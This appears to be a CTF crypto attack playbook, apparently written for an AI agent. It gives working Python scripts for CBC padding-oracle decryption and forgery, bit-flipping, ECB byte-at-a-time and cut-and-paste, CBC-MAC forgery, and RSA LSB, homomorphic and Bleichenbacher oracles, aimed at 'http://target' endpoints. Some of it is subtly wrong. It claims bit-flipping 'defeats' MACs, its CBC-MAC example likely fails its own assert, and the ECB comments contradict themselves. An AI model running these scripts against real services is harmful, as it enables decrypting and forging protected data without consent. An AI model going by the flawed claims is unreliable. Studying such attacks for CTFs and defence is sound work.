# Padding Oracles & Friends

Any distinguishable response to "is this decryption valid?" is a side channel sufficient to recover plaintext — or forge ciphertext. Padding oracle (CBC-PKCS#7) is the iconic example, but the same shape governs RSA LSB, Bleichenbacher PKCS#1v1.5, ECB byte-at-a-time, CBC bit-flipping, and CBC-MAC forgery. Workflow: **recognize the oracle → pick the matching attack → iterate byte-by-byte** (symmetric) or **half-plane-by-half-plane** (RSA). The attacker needs nothing more than a yes/no bit per query in most variants. Hydra image has pycryptodome, requests, gmpy2, sympy — enough for every attack in this file.

## Layer 0 — Identify the oracle

Before writing a single byte-recovery loop, enumerate what the server leaks. Most CTFs hand you the oracle in plain view; a few bury it in timing or error strings.

```text
For every "submit ciphertext → server responds" interaction, ask:

1. Does the response text/status/length change with plaintext validity?
     - HTTP 200 vs 400 vs 500  → explicit oracle
     - "Invalid padding" vs "Invalid signature" vs "Invalid user" → multi-bit oracle
     - Response body length differs → length oracle
     - Redirect vs inline error → status oracle
2. Does the response *timing* change with plaintext validity?
     - >50ms delta between valid/invalid → timing oracle (needs stats)
     - Early-return on bad padding, full processing on good padding → classic
3. Does a side effect change with plaintext validity?
     - Counter increments/decrements visible via another endpoint
     - Rate-limit bucket drains differently
     - Session cookie rotates on valid but not invalid
4. Does the response echo any of the plaintext?
     - Error message quotes decrypted text → plaintext oracle (free bytes)
     - "User 'admin\x01\x01' not found" leaks decrypted username
5. Does the scheme have structure you can manipulate?
     - RSA → homomorphic (c·2^e mod N → plaintext doubles)
     - CBC → XOR-homomorphic in the ciphertext domain
     - CTR/GCM → pure XOR stream (no padding, but nonce-reuse oracle exists)
```

Decision tree:

- CBC + "invalid padding" response → **§1 CBC padding oracle**
- CBC + decrypted plaintext reflected or string-compared → **§2 CBC bit-flip**
- ECB + `encrypt(user_input || secret)` → **§3 ECB byte-at-a-time**
- ECB + structured plaintext you can layout-control → **§4 ECB cut-and-paste**
- CBC-MAC used across multiple messages with same key → **§5 CBC-MAC forgery**
- RSA + "parity" or "LSB of plaintext" leaked → **§6 RSA LSB oracle**
- RSA + server returns full decryption for "valid" inputs → **§7 RSA homomorphic/full-plaintext oracle**
- RSA-PKCS#1v1.5 + "valid padding" distinguishable → **§8 Bleichenbacher**
- MSB or mid-bits leaked instead of LSB → **§9 generalized half-plane oracles**

---

## 1. CBC padding oracle (PKCS#7)

**Trigger:** Server decrypts attacker-supplied ciphertext and distinguishes "padding OK" from "padding bad" (via error string, status, timing, or crash). Vaudenay 2002.

**Recovery:** Byte-at-a-time, last block to first. For each adjacent block pair `(C_{i-1}, C_i)`, recover the 16-byte intermediate state `I_i = AES_dec(K, C_i)`; then `P_i = I_i ⊕ C_{i-1}`. We never learn `K`, but we recover every plaintext byte.

### Math

For a block `C_i`, decryption yields intermediate `I_i = AES_dec(K, C_i)` and then `P_i = I_i ⊕ C_{i-1}`. We replace `C_{i-1}` with a forged block `C'` and submit `C' || C_i`. The server will compute `P' = I_i ⊕ C'` and check PKCS#7 padding on `P'`.

- To recover byte `I_i[15]` (last byte of intermediate): choose `C'[15]` so that `P'[15] = 0x01`. Then `I_i[15] = C'[15] ⊕ 0x01`. We find the right `C'[15]` by brute-forcing all 256 values; the server accepts exactly one.
- Edge: server might accept if plaintext ends in `0x02 0x02` or `0x03 0x03 0x03` by chance. Disambiguate by also flipping `C'[14]` and re-testing — if still valid, the pad was `0x01`; otherwise `0x02+`.
- Step to byte 14: choose `C'[15] = I_i[15] ⊕ 0x02` (forces `P'[15] = 0x02`), then brute-force `C'[14]` so that `P'[14] = 0x02`. Generalize: when attacking byte `k` (1-indexed from end), we've already pinned bytes `1..k-1` to produce pad `k`; brute-force byte `k`; if accepted, `I_i[16-k] = C'[16-k] ⊕ k`.

### Python — self-contained oracle + decrypt

```python
# ./work/solve.py — CBC padding oracle attack (plaintext recovery)
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BLOCK_SIZE = 16

def oracle(ct: bytes) -> bool:
    """True iff server accepts ct as valid-padded."""
    r = requests.get("http://target/decrypt", params={"c": ct.hex()}, timeout=5)
    return r.status_code == 200
    # variants:
    #   return b"Invalid padding" not in r.text
    #   return b"Internal Server Error" not in r.text
    #   return (r.elapsed.total_seconds() > 0.4)   # timing oracle

def decrypt_block(prev: bytes, target: bytes) -> bytes:
    """Recover plaintext of `target` given preceding ct block `prev`. 16 bytes in, 16 out."""
    assert len(prev) == len(target) == BLOCK_SIZE
    intermediate = bytearray(BLOCK_SIZE)
    for k in range(1, BLOCK_SIZE + 1):          # k = pad value we're forcing
        idx = BLOCK_SIZE - k                    # the byte we're recovering
        forged = bytearray(BLOCK_SIZE)
        for j in range(idx + 1, BLOCK_SIZE):    # pin already-recovered bytes to produce pad k
            forged[j] = intermediate[j] ^ k
        found = False
        for guess in range(256):
            forged[idx] = guess
            if oracle(bytes(forged) + target):
                # disambiguate on first byte: could be 0x01 OR residual 0x02 0x02...
                if k == 1:
                    # perturb index 14; if still valid, pad was 0x01 as desired
                    probe = bytearray(forged)
                    probe[idx - 1] ^= 0xff
                    if not oracle(bytes(probe) + target):
                        continue            # it was a higher pad — keep searching
                intermediate[idx] = guess ^ k
                found = True
                break
        if not found:
            raise RuntimeError(f"byte k={k} (idx={idx}) unrecovered — re-check oracle semantics")
    return bytes(i ^ p for i, p in zip(intermediate, prev))

def attack(ciphertext: bytes, iv: bytes) -> bytes:
    """Decrypt full ciphertext. If IV is known, the first block is recoverable too."""
    blocks = [iv] + [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
    out = b""
    for i in range(len(blocks) - 1):
        out += decrypt_block(blocks[i], blocks[i+1])
        print(f"[+] block {i}: {out[-BLOCK_SIZE:]!r}", flush=True)
    return unpad(out, BLOCK_SIZE)

if __name__ == "__main__":
    iv = bytes.fromhex("00112233445566778899aabbccddeeff")
    ct = bytes.fromhex("...")
    print(attack(ct, iv))
```

### Encryption primitive (forge ciphertext for chosen plaintext)

Same oracle, opposite direction. Pick an arbitrary tail block `C_last` (random). Use the decrypt attack to learn `I_last = AES_dec(K, C_last)`; set `C_{last-1} = I_last ⊕ P_last_desired`. Recover `I_{last-1}`; set `C_{last-2} = I_{last-1} ⊕ P_{last-1}_desired`. Chain backwards. The final "IV" is `I_0 ⊕ P_0_desired`. Cost: 1 decrypt-block per chosen plaintext block.

```python
def encrypt_chosen(plaintext: bytes) -> tuple[bytes, bytes]:
    pt_blocks = [pad(plaintext, BLOCK_SIZE)[i:i+BLOCK_SIZE]
                 for i in range(0, len(pad(plaintext, BLOCK_SIZE)), BLOCK_SIZE)]
    ct = bytes(16) + b"\x01" * BLOCK_SIZE          # arbitrary tail block after all plaintext
    for p_block in reversed(pt_blocks):
        # decrypt_block(zero, ct[:16]) returns I XOR zero = I.
        inter = decrypt_block(bytes(BLOCK_SIZE), ct[:BLOCK_SIZE])
        ct = bytes(i ^ p for i, p in zip(inter, p_block)) + ct
    return ct[:BLOCK_SIZE], ct[BLOCK_SIZE:]        # (iv, ciphertext)
```

### Local oracle (for offline challenges)

```python
def local_oracle(key, iv):
    def _o(ct):
        try:
            unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), BLOCK_SIZE); return True
        except ValueError: return False
    return _o
```

### Tools

- `padbuster` (Ruby): `padbuster <url> <b64_ct> 16 -cookies 'auth=...'` — kitchen-sink, good for HTTP oracles. Not in image — `apt install padbuster` or use a Python rewrite.
- `padding-oracle-attacker` (Python): `pip install --user padding-oracle-attacker` — drop-in, works for arbitrary oracle functions.
- `poracle` (Python): `pip install --user poracle` — also drop-in.

Reference: Vaudenay, "Security Flaws Induced by CBC Padding — Applications to SSL, IPSEC, WTLS…", EUROCRYPT 2002 — https://link.springer.com/chapter/10.1007/3-540-46035-7_35

**Frequency:** ~40% of CBC challenges. Also appears when "verify-then-decrypt" is done in the wrong order (common) or when a HMAC check post-decrypt throws distinct errors for padding vs MAC.

---

## 2. CBC bit-flipping

**Trigger:** Server decrypts attacker-controlled CT and uses the plaintext in a string compare (`role == "admin"`, `user == "alice"`) OR reflects the plaintext back (without a MAC check). No padding oracle needed.

**Attack:** Flipping bit `b` of `C[i-1][j]` flips bit `b` of `P[i][j]` after decryption — while scrambling `P[i-1]` (because CBC decrypt depends on the previous CT block). If `P[i-1]` is "throwaway" (e.g., a timestamp or padding that the app doesn't validate), you can rewrite `P[i][j]` to anything you want, given you know the original `P[i][j]`.

Formula: `C'[i-1][j] = C[i-1][j] ⊕ P[i][j] ⊕ P_desired[i][j]`.

### Classic: flip `admin=0` → `admin=1` in a session cookie

```python
from Crypto.Cipher import AES
BLOCK_SIZE = 16

# Known cookie plaintext: 'user=alice; admin=0; expires=...'
# Assume we know the ciphertext from an unprivileged login. Block 2 contains 'admin=0; expires'.
# We attack block 2 from block 1 (CT block 1 XOR mask → PT block 2 perturbed).

ct = bytes.fromhex("...")
known_pt_block2 = b"admin=0; expires"  # 16 bytes — whatever block it really is
target_pt_block2 = b"admin=1; expires"

mask = bytes(a ^ b for a, b in zip(known_pt_block2, target_pt_block2))
blocks = [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
blocks[1] = bytes(c ^ m for c, m in zip(blocks[1], mask))   # block 1 is "prev" of block 2
forged_ct = b"".join(blocks)
# Block 2 in the forged ct decrypts to 'admin=1; expires'; block 1 decrypts to garbage.
# As long as app doesn't care about block 1, we're in.
```

### IV manipulation for block 0

If the IV is known and attacker-controllable (often in token formats: `IV || CT`), you flip bits in the IV to rewrite block 0 cleanly — no throwaway block cost. Formula: `IV'[j] = IV[j] ⊕ P[0][j] ⊕ P_desired[0][j]`.

```python
iv = bytes.fromhex("...")        # original IV (known — often prefixed to ciphertext)
ct = bytes.fromhex("...")
known_pt_block0 = b"role=guest     "  # pad to 16
target_pt_block0 = b"role=admin     "
mask = bytes(a ^ b for a, b in zip(known_pt_block0, target_pt_block0))
forged_iv = bytes(a ^ m for a, m in zip(iv, mask))
# Submit forged_iv || ct → block 0 decrypts to target_pt_block0.
```

**Defeats:** any HMAC/MAC over the ciphertext. Also defeats any per-block integrity check. If MAC is present and verified first, you need a padding oracle on the MAC error (still possible sometimes).

**Frequency:** ~25% of CBC challenges (especially cookie-forging, auth-bypass web challenges).

---

## 3. ECB byte-at-a-time (chosen-plaintext decryption)

**Trigger:** Oracle encrypts `prefix || user_input || secret` in ECB and returns ciphertext. Attacker controls `user_input`. Goal: recover `secret`.

**Key insight:** ECB is deterministic per block. If you align the secret's first byte as the last byte of a controlled block, you can brute-force 256 candidates and match ciphertext blocks.

**Note on `prefix`:** If unknown, probe its length by sending increasing `A`s until two consecutive blocks in the ciphertext are identical (means your controlled bytes spilled into a clean block). Subtract to get prefix length modulo block size.

```python
# Cryptopals set 2, challenge 12 / 14.
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
BLOCK_SIZE = 16

def ecb_oracle(user: bytes) -> bytes:
    # Server-side: AES.new(KEY, AES.MODE_ECB).encrypt(pad(user + SECRET, BLOCK_SIZE))
    ...

# 1. Detect ECB: A*64 yields ≥ 2 identical 16-byte blocks.
blob = ecb_oracle(b"A" * 64)
blocks = [blob[i:i+BLOCK_SIZE] for i in range(0, len(blob), BLOCK_SIZE)]
assert len(set(blocks)) < len(blocks), "not ECB"

# 2. Recover secret byte-by-byte.
def recover_secret():
    recovered = b""
    for i in range(len(ecb_oracle(b""))):
        block_idx = i // BLOCK_SIZE
        prefix   = b"A" * (BLOCK_SIZE - 1 - (i % BLOCK_SIZE))
        target   = ecb_oracle(prefix)[block_idx*BLOCK_SIZE:(block_idx+1)*BLOCK_SIZE]
        for g in range(256):
            trial = prefix + recovered + bytes([g])
            if ecb_oracle(trial)[block_idx*BLOCK_SIZE:(block_idx+1)*BLOCK_SIZE] == target:
                recovered += bytes([g])
                break
        else:
            return recovered       # hit PKCS#7 pad boundary — done
    return recovered
```

**Unknown prefix variant:** measure `prefix_len % BLOCK_SIZE` by sending `A*0, A*1, …` and finding the smallest `n` that causes two consecutive ciphertext blocks to match (which happens when your controlled `A`s spill a fully-aligned block). Then pad input to align the secret boundary before the loop above.

**Frequency:** ~20% of ECB challenges. Always detect ECB first (`A*32` → look for repeat in CT).

---

## 4. ECB cut-and-paste

**Trigger:** Server encrypts a structured plaintext like `email=<your>&role=user&uid=12` under ECB, and accepts any ciphertext as a session cookie.

**Attack:** Craft `<your>` inputs so that after block alignment, you have ciphertext blocks:

- `[email=AAAAA...]` (filler to align)
- `[admin<pad>        ]` (block starts with 'admin' + PKCS#7 pad, gotten by submitting it as part of email)
- `[...&role=user&uid=12]`

Then swap the 'user' block with the 'admin' block.

```python
# Cryptopals set 2, challenge 13.
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
BLOCK_SIZE = 16
KEY = b"yellowsubmarine!"

def profile_for(email: bytes) -> bytes:
    email = email.replace(b"&", b"").replace(b"=", b"")
    plaintext = b"email=" + email + b"&role=user&uid=12"
    return AES.new(KEY, AES.MODE_ECB).encrypt(pad(plaintext, BLOCK_SIZE))

# Step 1: get a ciphertext block that decrypts to 'admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
# Align so 'admin...' starts at block boundary:
#   'email=' is 6 bytes → pad to 10 bytes more → 10 'A's then 'admin' + 11 pad bytes.
evil_email = b"A" * 10 + b"admin" + b"\x0b" * 11
evil_ct = profile_for(evil_email)
admin_block = evil_ct[BLOCK_SIZE:BLOCK_SIZE*2]   # 2nd block is 'admin' + padding

# Step 2: get a ciphertext where 'role=' aligns to a block boundary, with just enough email
# so that 'user<pad>' is the final block.
#   We want: email=XXXXXXXXXXXXX&role= | user<pad>
#           |------16 bytes-------|
# email + '&role=' = 16 → email = 10 bytes 'A's? Let's compute:
#   'email=' + email + '&role=' = 6 + |email| + 6 = 12 + |email|
#   Want 12 + |email| ≡ 0 mod 16 → |email| = 4 → 'email=AAAA&role=' is 16.
#   Then 'user&uid=12' is 11 bytes → padded to 16, occupies a final block.
normal_ct = profile_for(b"A" * 13)   # 'email=AAAAAAAAAAAAA&role=' + 'user&uid=12' → 'user...' is last block
# Actually we need 'user&uid=12' alone in final block. 'email=AAAAAAAAAAAAA&role=' is 32 bytes;
# 'user&uid=12' is 11 → padded to 16 → last block. Good.

forged_ct = normal_ct[:BLOCK_SIZE*2] + admin_block
# Submit forged_ct as session cookie → decrypts to 'email=AAAAAAAAAAAAA&role=admin\x0b\x0b...'
# Server parses role as 'admin'. Pwned.
```

**Frequency:** classic CTF cookie-forging. ~10% of ECB web challenges.

---

## 5. CBC-MAC forgery

**Trigger:** A protocol uses CBC-MAC to authenticate messages, and the same key is used for multiple messages (and messages are not length-prefixed).

**Attack:** CBC-MAC chains IV through all blocks and outputs the final CT block as the tag. Given `tag(M1) = T1`, if we form `M2 = m1 || (m2[0] ⊕ T1) || m2[1..]`, then `tag(M1 || M2') = tag(M2)`. So any two-message pair with known tags lets us forge a tag for a concatenation.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
BLOCK_SIZE = 16

def cbc_mac(key: bytes, msg: bytes, iv: bytes = bytes(BLOCK_SIZE)) -> bytes:
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(msg, BLOCK_SIZE))
    return ct[-BLOCK_SIZE:]

# Attacker has (M1, T1) and (M2, T2), wants valid tag for a NEW message.
# Forge: M' = M1 || (M2[0] XOR T1) || M2[1:]
# Then CBC-MAC(M') = CBC-MAC(M2) = T2. Verified!
M1 = b"transfer 100 to alice" + b"\x00" * (BLOCK_SIZE - (len(b"transfer 100 to alice") % BLOCK_SIZE))
M2 = b"transfer 999999 to mallory                                  "
T1 = cbc_mac(b"YELLOW SUBMARINE", M1)
T2 = cbc_mac(b"YELLOW SUBMARINE", M2)

M2_blocks = [M2[i:i+BLOCK_SIZE] for i in range(0, len(M2), BLOCK_SIZE)]
first_mod = bytes(a ^ b for a, b in zip(M2_blocks[0], T1))
forged = M1 + first_mod + b"".join(M2_blocks[1:])
assert cbc_mac(b"YELLOW SUBMARINE", forged) == T2
# Forged message appears authenticated, but semantics are attacker-controlled.
```

**Defense:** ECBC-MAC or CMAC (NIST SP 800-38B) — prepend/append a length-dependent tweak. CTF protocols often use raw CBC-MAC and this wins.

**Frequency:** ~5% of MAC challenges — almost always in "custom protocol" designs where the author rolled their own authentication.

---

## 6. RSA LSB oracle (parity / least-significant-bit)

**Trigger:** Server decrypts RSA ciphertext and leaks only one bit — the parity of the plaintext (LSB, or "is it even/odd").

**Attack:** Binary search via homomorphic property. Ciphertext `c = m^e mod N`. Submit `c' = c · 2^e mod N`, server returns parity of `2m mod N`. Because `2m < 2N`, we have `2m mod N = 2m` (if `m < N/2`) or `2m - N` (if `m ≥ N/2`). Since `N` is odd, `N`'s parity flips `2m - N`'s parity vs `2m`'s: `2m` is even, so LSB(2m) = 0; LSB(2m - N) = 1. Therefore parity-of-2m tells you which half-plane m lives in. Halve the interval, repeat `log2(N)` times.

### Python

```python
# ./work/solve.py — RSA LSB oracle. Use fractional bounds to avoid integer truncation.
import gmpy2, requests
from fractions import Fraction
from Crypto.Util.number import long_to_bytes

def parity_oracle(c: int) -> int:
    r = requests.get("http://target/decrypt", params={"c": hex(c)[2:]})
    return int(r.text.strip())
    # variants: int("odd" in r.text), int(r.status_code == 200)

def rsa_lsb_recover(N: int, e: int, c0: int) -> bytes:
    two_e = gmpy2.powmod(2, e, N)
    lo, hi = Fraction(0), Fraction(N)
    c = c0
    for _ in range(N.bit_length() + 2):
        c = (c * two_e) % N
        if parity_oracle(int(c)) == 0:
            hi = (lo + hi) / 2        # m·2^i mod N stayed < N → m < midpoint
        else:
            lo = (lo + hi) / 2
    m = int(hi)
    for cand in (m - 1, m, m + 1):    # round-off margin
        if gmpy2.powmod(cand, e, N) == c0:
            return long_to_bytes(cand)
    return long_to_bytes(m)
```

### Cost

`log2(N)` queries. For 2048-bit RSA: 2048 queries. Fast and reliable.

**Frequency:** ~15% of RSA challenges. Tell: server code calls `decrypt()` and returns `m & 1` or `m % 2`.

---

## 7. RSA homomorphic / full-plaintext oracle

**Trigger:** Server decrypts and returns full plaintext — but refuses to decrypt the challenge ciphertext `c*` (blocklisted, or rate-limited to "other" inputs).

**Attack:** Pick any `s`, compute `c' = c* · s^e mod N`. `c'` is a "different" ciphertext (unblocked). Server returns `m' = (m* · s) mod N`. Recover `m* = m' · s^{-1} mod N`.

```python
from Crypto.Util.number import long_to_bytes, inverse
import requests, gmpy2

def decrypt_and_get(c: int) -> int:
    r = requests.post("http://target/decrypt", json={"c": hex(c)[2:]})
    return int(r.json()["m"], 16)

def homomorphic_recover(N: int, e: int, c_target: int, s: int = 2) -> bytes:
    c2 = (c_target * pow(s, e, N)) % N
    assert c2 != c_target, "need s not 1"
    m2 = decrypt_and_get(c2)
    m = (m2 * inverse(s, N)) % N
    return long_to_bytes(m)

# In practice: s=2 is simplest, but if server blocks multiples-of-2 plaintexts, use s=3, 5, etc.
```

**Trap:** server may check `c != c_target` OR check plaintext format (e.g., "must start with 0x00 0x02..."). If the latter, you've hit a Bleichenbacher oracle (§8); switch gears.

**Frequency:** ~10% of RSA challenges. Common in "decryption service" problems where the challenge input is the one blocked value.

---

## 8. Bleichenbacher PKCS#1v1.5 oracle

**Trigger:** RSA decryption with PKCS#1v1.5 padding where server distinguishes "valid padding" (plaintext starts with `0x00 0x02`) from "invalid" (anything else). SSL v3 era, plus modern reincarnations (ROBOT 2017, Marvin 2023 cache-timing variants).

**Attack:** Narrow the plaintext range multiplicatively. Very rough sketch:

1. Find `s_1` such that `c · s_1^e mod N` is PKCS-conformant. This means `2B ≤ m · s_1 mod N ≤ 3B - 1` where `B = 2^(8*(k-2))` and `k` = byte-length of `N`.
2. Update the candidate range `M_i` of plaintext to intervals `[a, b]` such that `a ≤ m ≤ b` and `m · s` lies in `[2B, 3B-1]` mod `N`.
3. Iterate: shrink interval by finding `s_{i+1}` that keeps at least one conformant interval.
4. Converge to single plaintext.

### Mechanics (Bleichenbacher 1998, attack 1)

Full impl is ~150 lines. For CTF, adopt a tested one:

- https://github.com/GrosQuildu/CryptoAttacks (`CryptoAttacks.PublicKey.rsa.bleichenbacher_pkcs15`) — drop-in.
- https://github.com/mimoo/RSA-and-LLL-attacks — educational reference.
- `robot-detect` (Python) — detects oracle in a TLS endpoint but doesn't exploit.

```python
# Skeleton — wire up pkcs_oracle, call the tested impl.
from Crypto.Util.number import long_to_bytes
import requests

def pkcs_oracle(c: int) -> bool:
    r = requests.post("http://target/rsa_decrypt", json={"c": hex(c)[2:]})
    return r.status_code == 200        # canonical: 200 valid, 400/500 invalid

# Step 1 (blinding): find s0 s.t. c*s0^e mod N is PKCS-conformant (often s0=1 if c came from real encrypt).
# Step 2a: find smallest s1 >= ceil(N/3B) s.t. (c0*s1^e) mod N is conformant.
# Step 3 (interval narrowing): for current intervals M_i, derive new M_{i+1} from
#         r s.t. 2B + rN <= m*s <= 3B - 1 + rN  →  split (a,b) by r range.
# Step 4: repeat until single interval of width 1. Final m = a*s0^-1 mod N.
# B = 2^(8*(k-2)) where k = byte-length of N. Conformant = 2B <= m <= 3B-1.
```

### Query cost

- BB98: ~1M queries for 1024-bit RSA. BB12 (Bardou et al.): ~10k. CTF variants often ~100–1000.

**References:** Bleichenbacher CRYPTO 1998 — https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf. ROBOT: Böck–Somorovsky–Young 2018 — https://www.robotattack.org/.

**Frequency:** ~8% of RSA challenges. Tell: "PKCS#1" in source, decryption service, distinct errors for padding vs other failures.

---

## 9. MSB / mantissa / half-plaintext oracles (generalization)

Any oracle leaking k > 0 consistent bits of the plaintext per query collapses via binary search. LSB (§6) is the k=1 case.

- **MSB oracle:** `m' = (m + N/2) mod N` parity = MSB(m). Same code as §6 with one offset.
- **"Plaintext mod k" oracle:** multiply by `k^{-1} mod N` to shift the leak window.
- **Range oracle** ("is m > T"): plain binary search, `log2 N` queries.
- **Top-t bits oracle:** recover m in `~log2(N) / t` queries; halve the unknown region `2^t`-ways per round.

**Recipe:** find a multiplicative transform that moves the unknown piece of `m` into the bits the oracle leaks.

---

## Oracle detection techniques (side-channel menu)

When the challenge doesn't scream "oracle" at you, probe for one:

### Timing

Send 1000 valid and 1000 invalid ciphertexts; plot histogram of response times. >50 ms median difference = actionable oracle. Use Welch's t-test for small deltas.

```python
import requests, time, statistics
def time_sample(ct):
    t = time.perf_counter()
    requests.get("http://target/decrypt", params={"c": ct.hex()})
    return time.perf_counter() - t

valid_cts   = [bytes.fromhex("valid...")] * 200
invalid_cts = [bytes.fromhex("random...")] * 200
valid_times = [time_sample(c) for c in valid_cts]
inval_times = [time_sample(c) for c in invalid_cts]
from statistics import mean, stdev
print("valid:", mean(valid_times), stdev(valid_times))
print("inval:", mean(inval_times), stdev(inval_times))
# If means differ by > 3 sigma → oracle.
```

### Error strings

Fuzz with malformed ciphertexts; diff response bodies pairwise. Distinct stack traces per failure mode = multi-bit oracle. Look especially for:

- "Invalid padding" vs "Invalid MAC" vs "Invalid user"
- SQL errors leaking column values (not crypto but same class)
- HTTP 400 vs 500 split — 400 = app-level rejection, 500 = crash during processing

### HTTP status / length

Loop over 10–100 ciphertexts, record `(status_code, content_length)` tuples, bin by frequency. Any bin < 10% of total is a candidate oracle value.

### Stateful side effects

Many web apps increment a counter, log, rate-limit, or rotate a cookie on "valid" inputs. Probe `/status` (or `/metrics`, `/admin`, or the rate-limit headers `X-RateLimit-Remaining`) between requests.

```python
def has_side_effect(ct):
    before = requests.get("http://target/rate").json()["remaining"]
    requests.get("http://target/decrypt", params={"c": ct.hex()})
    after = requests.get("http://target/rate").json()["remaining"]
    return before - after   # 1 if validated, 0 if rejected early
```

### Crash vs clean exit

In offline challenges with a binary, run under `gdb` and flag `SIGSEGV` vs `exit(0)`. A memory-unsafe padding check can be fuzzed into leaking plaintext bytes (covered in pwn-specialist territory; flag as a crossover).

---

## Tools in Hydra image

- `pycryptodome`
  - `Crypto.Cipher.AES` — ECB / CBC / CTR / GCM
  - `Crypto.PublicKey.RSA` — key parsing, `n`, `e`, `d`
  - `Crypto.Util.number` — `long_to_bytes`, `bytes_to_long`, `inverse`, `isPrime`, `getPrime`
  - `Crypto.Util.Padding` — `pad(data, block_size)`, `unpad(data, block_size)` (raises `ValueError` on invalid)
- `requests` — HTTP oracles
- `gmpy2` — `mpz`, `powmod`, `invert`, `log2` — fast RSA-scale arithmetic
- `sympy` — `discrete_log`, `factorint` (RSA-adjacent)
- `fpylll` — for lattice-assisted Bleichenbacher variants (e.g., FiLMNR)

## Install on-demand

- `padbuster` (Ruby) — `apt install padbuster`; padding oracle over HTTP.
- `padding-oracle-attacker` (Python) — `pip install --user padding-oracle-attacker`; pure-Python, drop-in.
- `poracle` (Python) — `pip install --user poracle`.
- Bleichenbacher: `git clone https://github.com/GrosQuildu/CryptoAttacks` (MIT).
- `bleichenbacher` modules — multiple repos, port 150 lines.

---

## Common traps

- **PKCS#7 vs PKCS#5.** PKCS#5 is PKCS#7 restricted to 8-byte blocks (DES). For AES (16-byte blocks), they're synonymous. Don't let a "PKCS#5" mention throw you.
- **IV known vs unknown.** If the IV is unknown (not prefixed to ciphertext and not fixed-public), the *first* plaintext block is unrecoverable from the padding oracle alone (you'd need a block before it, which doesn't exist). All subsequent blocks recover fine.
- **Rate limits.** HTTP oracles against a live service throttle at ~10 req/s. Add `time.sleep(0.1)` between queries, parallelize across connections carefully, or rotate source IP if the challenge allows.
- **Multi-bit oracles leak more than you think.** An HTTP 500 with *different stack traces per error type* is really 3+ oracles stacked — you can sometimes skip the classical byte-at-a-time and just read the error text.
- **Modern TLS constant-time.** Real TLS 1.2+ implementations mitigate Bleichenbacher with constant-time PKCS unpadding and a random per-connection pre-master secret on failure. CTF challenges almost always forget this. If an oracle works in CTF but is claimed to be "real TLS", check if they're using a pre-2018 library version.
- **ECB detection requires ≥ 2 blocks of repeated plaintext.** Test with `A*32` and look for any duplicate 16-byte slice in the ciphertext. One duplicate → ECB; zero duplicates → CBC/CTR/something.
- **Oracle caches.** Some servers cache decryption results. If you re-submit the same CT and get a faster response second time, you've hit a cache and your timing oracle is polluted. Add randomness to bypass.
- **CBC-MAC length hackery.** The forgery in §5 requires messages whose lengths match (or are multiples) — if the protocol length-prefixes messages, CBC-MAC forgery fails. Test empirically.
- **RSA LSB fractional precision.** Integer-truncated binary search converges to `m ± 1` or `m ± 2`. Always verify candidates with `pow(cand, e, N) == c` before claiming the plaintext.
- **Encoding mismatches.** Server may want base64, hex, or URL-encoded ciphertext. `padbuster` lets you specify; in Python, explicitly `.hex()`, `b64encode`, or `quote`.
- **"Oracle" that isn't.** Server returning plaintext on valid decryption but "error" on invalid is a *full* plaintext oracle, not a binary one. Use §7 directly.

---

## Worked example — CBC padding oracle, local HTTP service

Drop-in `./work/solve.py`. Adjust `TARGET`, `oracle`, and whether the IV is prefixed to the ciphertext or transmitted separately.

```python
import requests
from Crypto.Util.Padding import unpad
BLOCK_SIZE = 16
TARGET = "http://localhost:8080/decrypt"

def oracle(ct_hex: bytes) -> bool:
    r = requests.get(TARGET, params={'c': ct_hex.hex()})
    return r.status_code == 200    # True = valid padding

def decrypt_block(prev: bytes, target: bytes) -> bytes:
    inter = bytearray(BLOCK_SIZE)
    for k in range(1, BLOCK_SIZE + 1):
        idx = BLOCK_SIZE - k
        forged = bytearray(BLOCK_SIZE)
        for j in range(idx + 1, BLOCK_SIZE):
            forged[j] = inter[j] ^ k
        for g in range(256):
            forged[idx] = g
            if oracle(bytes(forged) + target):
                if k == 1:  # disambiguate trailing 0x02 0x02, etc.
                    probe = bytearray(forged); probe[idx - 1] ^= 0xff
                    if not oracle(bytes(probe) + target): continue
                inter[idx] = g ^ k
                break
        else:
            raise RuntimeError(f"byte {idx} unrecovered")
    return bytes(i ^ p for i, p in zip(inter, prev))

if __name__ == "__main__":
    iv = bytes.fromhex("00112233445566778899aabbccddeeff")
    ct = bytes.fromhex("...")
    blocks = [iv] + [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]
    pt = b"".join(decrypt_block(blocks[i], blocks[i+1]) for i in range(len(blocks) - 1))
    print(unpad(pt, BLOCK_SIZE))
```

---

## References

- Vaudenay, "Security Flaws Induced by CBC Padding" (EUROCRYPT 2002) — https://link.springer.com/chapter/10.1007/3-540-46035-7_35
- Bleichenbacher, "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1" (CRYPTO 1998) — https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
- Böck, Somorovsky, Young, "Return Of Bleichenbacher's Oracle Threat (ROBOT)" (USENIX 2018) — https://www.robotattack.org/
- Bardou, Focardi, Kawamoto, Simionato, Steel, "Efficient Padding Oracle Attacks on Cryptographic Hardware" (CRYPTO 2012)
- Cryptopals Matasano Challenges — set 2 (ECB), set 3 (CBC padding oracle), set 6 (RSA oracles) — https://cryptopals.com/
- CryptoHack Padding Oracle course — https://cryptohack.org/courses/symmetric/padding-oracle/
- PortSwigger Web Academy — padding oracle labs (live HTTP practice)
- `jvdsn/crypto-attacks` — https://github.com/jvdsn/crypto-attacks (has oracle attacks, pure-python)
- `GrosQuildu/CryptoAttacks` — https://github.com/GrosQuildu/CryptoAttacks (tested Bleichenbacher)
- Palisade arxiv 2412.02776 — general survey; check one-liner shell tricks before scripting full oracle

---

## Stop conditions

Stop and reclassify / postmortem when:

1. **Timing oracle signal-to-noise too low.** After 5000 samples, means differ by < 1σ. Either the server has constant-time handling (rare in CTF) or the network jitter masks the signal. Move source closer (deploy on same LAN), increase sample count, or reclassify.
